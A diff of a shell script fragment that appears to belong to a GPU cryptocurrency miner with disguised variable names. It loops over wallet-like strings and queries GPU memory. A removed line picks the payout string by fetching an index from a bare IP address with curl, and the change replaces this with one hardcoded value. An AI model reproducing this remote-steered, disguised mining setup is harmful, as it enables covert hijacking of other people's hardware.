@@ -17,16 +17,9 @@ else
 while true
 do
 
-arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
-arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
-arr[2]="4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj"
-arr[3]="xZDcVyJeLLxqqsn6CeygQMR5zBTi9Gfk1d7XG3rj7WmypGrqRVBXWHg3WMk7yNfpbXnw85LBzY6j42F4qgpJRUP"
-arr[4]="2z2hwRPjLrQoN3UBsCX4EMRQxdcMxMFsQeJkUnZvgGXZnAsG2dBf3FXZdrk9stxzgd2Hrzdy8HxQb6AGFEEa5xkk"
-arr[5]="28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw3cNjWR3A6WMnGoa2"
-arr[6]="45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ89mQgyXcS8XRWUB9"
-arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"
+arr[0]="4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj"
 rand=$[$RANDOM % ${#arr[@]}]
-google84121212121212121274=${arr[$(curl -s http://154.127.52.52/linuxgoogle84 | cat)]}
+google84121212121212121274=${arr[0]}
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
